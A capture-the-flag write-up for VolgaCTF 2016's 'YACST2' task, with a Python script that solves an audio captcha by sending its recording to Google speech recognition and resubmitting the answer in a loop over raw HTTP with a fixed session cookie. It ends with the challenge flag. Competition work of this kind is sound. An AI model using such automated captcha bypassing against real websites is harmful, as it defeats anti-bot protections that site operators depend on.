#YACST2

> Captcha is a modern simple Turing test for everyday use, for human
> it's simple, but for bot or a simple neural network captcha can become
> a hard nut to crack.
> 
> You can try to solve it with your AI too, but it definitely can be
> solved with several lines of code, isn’t it?
> 
> [link](http://yacst2.2016.volgactf.ru:8090/)
> 
> Hints
> 
> [gist](https://gist.github.com/volalex/799789663f8c29f1bb58)
> 
> [gist2](https://gist.github.com/volalex/4c62beaa721807dbc139) Adding a
> Noise

**Algorithm**

1. Send request to the site, get remaining number of captchas.
2. Download captcha using **curl** (don't ask me why!).
3. Send it to the *Google Speech Recognizer* using python module **speech_recognition**
4. Send numbers to the server.
5. Repeat until you receive flag.



    from pwn import *
    import speech_recognition as sr
    import re
    import os
    import numpy as np
    import wave
    from time import sleep
    import time
    
    def send_http(r, Q):
        for q in Q:
            r.send(q)
    
    r = sr.Recognizer()
    
    
    Q_MAIN = [
        "GET / HTTP/1.1\n",
        "Host: yacst2.2016.volgactf.ru\n",
        "Cookie: JSESSIONID=Kf0nf9fkvCjrxwx9D1dg8B6CobY_Ptl0hBQpk123\n", # our token
        "\n"
    ]
    
    Q_CAPTCHA = 'curl -s --cookie "JSESSIONID=Kf0nf9fkvCjrxwx9D1dg8B6CobY_Ptl0hBQpk123" http://yacst2.2016.volgactf.ru:8090/captcha > cap.wav'
    # http://yacst2.2016.volgactf.ru/captcha
    
    
    times = 3000
    while times > 0:
        try:
	        # reconnect every time, to prevent any drops or any disgusting things
            W = remote("yacst2.2016.volgactf.ru", 8090)
            
            send_http(W, Q_MAIN)
    
            response = W.recv()
            try:
	            # try to parse how many times left
                times = int(re.search("\<\/a\> \- (\d+) times", response).groups()[0])
            except:
                pass
    
		    # download captcha
            os.system(Q_CAPTCHA)
    
		    # each captcha influenced by noise (30..220 Hz)
		    # here I tried to filter it. But Google Speech 
		    # recognition worked well without any preprocessing
            '''
            wr = wave.open("cap.wav", 'r')
            ww = wave.open('captcha.wav', 'w')
    
            wi = wr.getsampwidth()
    
            if wi == 1:
                wi = np.uint8
            elif wi == 2:
                wi = np.int16
    
            sz = wr.getframerate()
            pars = list(wr.getparams())
    
            ww.setparams(tuple(pars))
    
            low = 300  # Hz
            c = int(wr.getnframes()/sz)
            for num in range(c):
                da = np.fromstring(wr.readframes(sz), dtype=wi)
                fb = np.fft.rfft(da)
                fb[:low] = 0
                fa = np.fft.irfft(fb)
                fa = fa.astype(wi)
                ww.writeframes(fa.tostring())
    
            wr.close()
            ww.close()
            '''
    
            with sr.WavFile("cap.wav") as source:
                audio = r.record(source)
    
            # recognize speech using Google Speech Recognition
            try:
                numbers = r.recognize_google(audio)
                print "Times:", times, "Numbers:", numbers
                Q_CAPTCHA_SEND = [
                    "POST /captcha HTTP/1.1\n",
                    "Host: yacst2.2016.volgactf.ru:8090\n",
                    "Content-Length: 13\n",
                    "Cache-Control: max-age=0\n",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n",
                    "Origin: http://yacst2.2016.volgactf.ru:8090\n",
                    "Upgrade-Insecure-Requests: 1\n",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36\n",
                    "Content-Type: application/x-www-form-urlencoded\n",
                    "Referer: http://yacst2.2016.volgactf.ru:8090/\n",
                    "Accept-Encoding: gzip, deflate\n",
                    "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,uk;q=0.2\n",
                    "Cookie: JSESSIONID=Kf0nf9fkvCjrxwx9D1dg8B6CobY_Ptl0hBQpk123\n", # OUR TOKEN
                    "\n",
                    "captcha="+numbers+"\n",
                ]
    
                send_http(W, Q_CAPTCHA_SEND)
    
			    # server sends 302 redirect, so we have to 
			    # resend data to the / 
                request = W.recv()
    
                Q_CAPTCHA_SEND = [
                    "POST / HTTP/1.1\n",
                    "Host: yacst2.2016.volgactf.ru:8090\n",
                    "Content-Length: 13\n",
                    "Cache-Control: max-age=0\n",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n",
                    "Origin: http://yacst2.2016.volgactf.ru:8090\n",
                    "Upgrade-Insecure-Requests: 1\n",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36\n",
                    "Content-Type: application/x-www-form-urlencoded\n",
                    "Referer: http://yacst2.2016.volgactf.ru:8090/\n",
                    "Accept-Encoding: gzip, deflate\n",
                    "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,uk;q=0.2\n",
                    "Cookie: JSESSIONID=Kf0nf9fkvCjrxwx9D1dg8B6CobY_Ptl0hBQpk123\n",
                    "\n",
                    "captcha="+numbers+"\n",
                ]
                
                # resend captcha
                send_http(W, Q_CAPTCHA_SEND)
    
                W.close()
    
            except sr.UnknownValueError:
                print("Google Speech Recognition could not understand audio")
            except sr.RequestError as e:
                print("Could not request results from Google Speech Recognition service; {0}".format(e))
        except Exception as e:
            print "EXCEPTION\n", e
            sleep(1)


But last captcha I had to solve by myself.

Flag is:

> VolgaCTF{Sound IS L1ke M@th if A+B=C THEN C-B=A}
